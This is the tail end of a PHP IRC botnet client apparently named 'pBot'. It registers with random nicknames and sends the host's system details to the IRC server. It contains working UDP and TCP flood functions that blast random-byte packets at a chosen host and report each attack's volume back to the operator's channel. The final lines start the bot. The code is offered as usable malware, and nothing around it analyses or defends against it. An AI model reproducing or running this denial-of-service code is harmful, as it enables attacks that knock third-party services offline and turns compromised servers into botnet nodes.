			"PleNgEhl", "sang|faj", "[menari]", "Inviter|", "T_T`b`oL", "auth-bot", "KePendet", "[]t[]u[]", 
			"co_sedih", "mati_aja", "Ce_pleng", "Ce_ChA_p", "sapa-mau", "dukun-ca", "likinggg"); 
			
  $ident = $prify[rand(0,count($prify) - 1)];
  
  $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
  }

  function udpflood($host,$packetsize,$time) {
	$this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 


       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets pacotes para $host:$port."); 
 }
}
$bot = new pBot; 
$bot->start(); 

echo "pbot";

?>


